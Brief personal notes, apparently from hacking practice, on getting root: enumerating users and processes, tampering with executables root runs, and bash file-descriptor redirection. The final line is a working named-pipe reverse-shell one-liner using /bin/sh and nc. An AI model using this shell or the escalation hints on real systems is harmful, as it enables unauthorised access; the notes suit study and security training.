## Things in the past that have worked into getting root

Always watch for other users: useful commands: w groups id users

Watch for other processes (specially anything from root), sometimes you may be able to modify an executable that they usually run: useful commands: ps

To redirect and in general for file descriptors:

remember that > is for ouptut and < for input (this also does substitution)

num1>&num2 to redirect num1 to num2 (if you concatenate multiple the output of one will travell until it can be outputed somewhere)

num> file to redirect the file descriptor to file (read num becomes file) (it is important as then you may not be able to redirect another file descriptor to num, as bash reads redirections rigth to left)

exec: allows to open new file descriptors (and execute another command) that can be used for later: Ex: 3 <> path/file

mkfifo name: creates a file descriptor with name "name" (it somewhat behaves as a file): Ex mkfifo pipe1; /bin/sh -i 2>&1 0<pipe1 | nc 127.0.0.1 2020 1>pipe1